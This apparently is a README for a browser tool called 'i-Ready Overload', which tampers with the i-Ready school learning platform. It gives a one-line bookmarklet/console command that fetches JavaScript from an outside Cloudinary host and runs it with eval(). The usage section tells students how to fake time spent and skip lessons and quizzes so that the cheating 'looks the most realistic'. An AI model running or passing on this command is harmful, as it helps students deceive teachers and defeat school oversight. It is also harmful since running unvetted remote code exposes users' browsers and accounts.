## about

i-Ready Overload can run multiple exploits using only one command. The most useful of which are the lesson skipper and minutes hack, but there are some other features built-in as well. Originally made by cupiditys, licensed under the GNU GPL Version 2.0, which permits redistribusion here.

## install

There are a few ways to install i-Ready overload, so pick the one that best suites you according to the main page. Make sure to follow the directions from there for following your specific method.

### bookmarklet/console

You can either use a bookmarklet or the console to run the exploit, so use the command below in the method you wish to use.

``fetch(`https://res.cloudinary.com/cupiditys/raw/upload/v${Math.floor(Math.random() * 9999999)}/bookmarklet.js`).then((res) => res.text().then((t) => eval(t)))``

## use

Once you've ran the exploit, a menu should pop-up and from there you can select a bunch of different options to mess with i-Ready. Everything you need to know should be there for you, so it's not really that useful to put the information here.

At least to make it look the most realistic, run the minutes hack and let it run for a bit while you do something else. Once you have around 20 minutes or more, run the lesson skipper, you will need to run it more than once, one time for the lesson and another time for the quiz.
